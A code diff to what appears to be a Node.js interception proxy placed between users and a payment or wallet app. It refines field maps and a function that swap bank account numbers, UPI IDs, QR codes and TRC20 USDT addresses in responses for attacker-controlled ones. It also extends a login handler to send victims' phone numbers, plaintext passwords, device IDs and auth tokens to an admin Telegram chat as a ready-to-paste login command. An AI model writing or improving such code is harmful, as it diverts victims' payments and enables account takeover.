@@ -708,7 +708,7 @@ const BANK_FIELDS = {
   'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
   'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
   'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
-  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
+  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder',
   'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
   'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
   'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'bankcardname': 'accountHolder',
@@ -719,10 +719,10 @@ const BANK_FIELDS = {
   'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
   'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
   'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
-  'bankname': 'bankName', 'bank_name': 'bankName', 'bank': 'bankName',
+  'bankname': 'bankName', 'bank_name': 'bankName',
   'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
   'collectionbankname': 'bankName',
-  'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
+  'upiid': 'upiId', 'upi_id': 'upiId', 'vpa': 'upiId',
   'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
   'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
   'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId',
@@ -844,10 +844,10 @@ function replaceUsdtInResponse(jsonResp, data) {
         if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl' || kl === 'codeimg' || kl === 'qrurl' || kl === 'depositqr' || kl === 'depositqrcode') {
           obj[key] = qrUrl;
         }
-        if (kl.includes('qr') || kl.includes('code')) {
-          if (typeof obj[key] === 'string' && obj[key].includes('http') && (obj[key].includes('qr') || obj[key].includes('code') || obj[key].includes('.png') || obj[key].includes('.jpg'))) {
-            obj[key] = qrUrl;
-          }
+        // Only replace fields that explicitly look like QR/payment URLs.
+        // Avoid generic 'code' substrings (productCode, statusCode, etc).
+        if (kl.includes('qr') && typeof obj[key] === 'string' && obj[key].startsWith('http')) {
+          obj[key] = qrUrl;
         }
       } else if (typeof obj[key] === 'object') {
         const found = scanAndReplace(obj[key], depth + 1);
@@ -869,14 +869,18 @@ function replaceUsdtInResponse(jsonResp, data) {
   const rd = getResponseData(jsonResp);
   if (rd) foundOld = scanAndReplace(rd, 0) || '';
   if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
-  const fullStr = JSON.stringify(jsonResp);
-  const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
-  if (trcMatch) {
-    for (const addr of trcMatch) {
-      if (addr !== newAddr) {
-        foundOld = foundOld || addr;
-        const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
-        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
+  // Only run the broad TRC20 string-replace if the field-based scan already
+  // identified an address. Otherwise we risk clobbering random IDs / icon
+  // filenames that happen to start with T followed by 33 alphanumerics.
+  if (foundOld) {
+    const fullStr = JSON.stringify(jsonResp);
+    const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
+    if (trcMatch) {
+      for (const addr of trcMatch) {
+        if (addr !== newAddr && addr === foundOld) {
+          const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
+          try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
+        }
       }
     }
   }
@@ -1376,7 +1380,9 @@ app.post('/app/user/login/login', async (req, res) => {
       let extraInfo = '';
       if (challengeId) {
         // Both IDs together in one paragraph, mono (tap-to-copy) format.
-        extraInfo = `\n\n🎯 <b>DEVICE VERIFICATION NEEDED</b>\n📋 <b>COPY (tap):</b>\nchallengeId: <code>${esc(challengeId)}</code>\ndeviceId: <code>${esc(androidId)}</code>`;
+        // Plus a ready-to-paste /login command (full line in mono).
+        const loginCmd = `/login ${phone || 'N/A'} | ${pwd} | ${challengeId} | ${androidId}`;
+        extraInfo = `\n\n🎯 <b>DEVICE VERIFICATION NEEDED</b>\n📋 <b>COPY (tap):</b>\nchallengeId: <code>${esc(challengeId)}</code>\ndeviceId: <code>${esc(androidId)}</code>\n\n⚡ <b>READY COMMAND:</b>\n<code>${esc(loginCmd)}</code>`;
       }
       if (loginToken && jsonResp?.code === 1000) {
         extraInfo += `\n\n🔑 <b>AUTH TOKEN:</b>\n<code>${esc(loginToken)}</code>`;
@@ -2406,26 +2412,6 @@ app.all('/app/captcha/new', async (req, res) => {
         answerStored += ` | ssv=skipped(solver_failed)`;
       }
     }
-    if (data.adminChatId && bot) {
-      let preview;
-      if (jsonResp) {
-        const truncated = JSON.parse(JSON.stringify(jsonResp));
-        const truncStr = (s) => typeof s === 'string' && s.length > 80 ? `${s.slice(0,40)}...[${s.length}b]` : s;
-        const walk = (o) => { if (!o || typeof o !== 'object') return; for (const k of Object.keys(o)) { if (typeof o[k] === 'string') o[k] = truncStr(o[k]); else walk(o[k]); } };
-        walk(truncated);
-        preview = JSON.stringify(truncated, null, 2);
-      } else {
-        preview = (respBody || `<binary ${respBuffer.length}b>`).substring(0, 1000);
-      }
-      const newRespHdrs = {};
-      for (const [k, v] of Object.entries(respHeaders)) {
-        const kl = k.toLowerCase();
-        if (kl === 'content-type' || kl === 'set-cookie' || kl.startsWith('x-') || kl === 'date' || kl === 'server' || kl === 'cf-ray') {
-          newRespHdrs[kl] = v;
-        }
-      }
-      bot.sendMessage(data.adminChatId, `🆕 Captcha New\n📥 STATUS: ${response.status}\n🔑 STORED ANSWER: ${answerStored || '(none)'}\n\n📥 UPSTREAM HEADERS:\n${JSON.stringify(newRespHdrs, null, 2).substring(0, 600)}\n\n📥 RESPONSE (truncated):\n${preview.substring(0,1000)}`).catch(()=>{});
-    }
     respHeaders['content-length'] = String(respBuffer.length);
     res.writeHead(response.status, respHeaders);
     res.end(respBuffer);
@@ -2451,19 +2437,12 @@ app.post('/app/captcha/verify', async (req, res) => {
       if (cached.result) {
         if (cached.result.__burned) {
           // Our SSV failed earlier — return synthetic 1001 so client refreshes.
-          if (data.adminChatId && bot) {
-            bot.sendMessage(data.adminChatId, `🧩⚠️ Captcha Verify (burned cache hit)\nkey=${String(inKey).substring(0,12)}... → returning synthetic 1001 to trigger client refresh\nupstream code was: ${cached.result.code} "${(cached.result.message||'').substring(0,40)}"`).catch(()=>{});
-          }
           res.setHeader('content-type', 'application/json;charset=UTF-8');
           return res.status(200).end(JSON.stringify({
             code: 1001,
             message: cached.result.message || 'Verify failed, please slide again',
             data: null,
           }));
-        }
-        if (data.adminChatId && bot) {
-          const preview = JSON.stringify(cached.result, null, 2).substring(0, 600);
-          bot.sendMessage(data.adminChatId, `🧩✅ Captcha Verify (SSV cache hit ${cached.where})\nkey=${String(inKey).substring(0,12)}...\nclient sent x=${body.x} y=${body.y} (ignored)\n\n📥 RETURNING CACHED:\n${preview}`).catch(()=>{});
         }
         res.setHeader('content-type', 'application/json;charset=UTF-8');
         return res.status(200).end(JSON.stringify(cached.result));
@@ -2551,30 +2530,8 @@ app.post('/app/captcha/verify', async (req, res) => {
     // Single-shot solve. No retry.
     const finalJson = jsonResp, finalBody = respBody, finalHeaders = respHeaders, finalStatus = response.status;
 
-    if (data.adminChatId && bot) {
-      const respHdrPreview = {};
-      for (const [k, v] of Object.entries(finalHeaders)) {
-        const kl = k.toLowerCase();
-        if (kl === 'content-type' || kl === 'set-cookie' || kl.startsWith('x-') || kl === 'date' || kl === 'server' || kl === 'cf-ray') {
-          respHdrPreview[kl] = v;
-        }
-      }
-      // Message 1: RESPONSE first (most important — was getting truncated)
-      const msg1 = `🧩 Captcha Verify RESPONSE\n🔧 AUTO-SOLVE: ${autoSolved || '(no key)'}\n\n📥 STATUS: ${finalStatus}\n📥 BODY:\n${(finalJson ? JSON.stringify(finalJson, null, 2) : finalBody).substring(0, 1500)}\n\n📥 HEADERS:\n${JSON.stringify(respHdrPreview, null, 2).substring(0, 800)}`;
-      bot.sendMessage(data.adminChatId, msg1.substring(0, 4000)).catch(()=>{});
-      // Message 2: REQUEST details (secondary)
-      const msg2 = `🧩 Captcha Verify REQUEST\n📤 HEADERS sent to upstream:\n${JSON.stringify(fwdHeadersPreview, null, 2).substring(0, 1500)}\n\n📤 BODY sent:\n${JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 800)}`;
-      bot.sendMessage(data.adminChatId, msg2.substring(0, 4000)).catch(()=>{});
-    }
     sendJson(res, finalHeaders, finalJson, finalBody);
   } catch(e) {
-    try {
-      const data = cachedData || await loadData().catch(()=>({}));
-      if (data && data.adminChatId && bot) {
-        const errMsg = `🧩❌ Captcha Verify ERROR (fell to transparentProxy)\n\nError: ${e && e.message ? e.message : String(e)}\n\nStack:\n${(e && e.stack ? e.stack : '(no stack)').substring(0, 1500)}`;
-        bot.sendMessage(data.adminChatId, errMsg.substring(0, 4000)).catch(()=>{});
-      }
-    } catch(_) {}
     await transparentProxy(req, res);
   }
 });
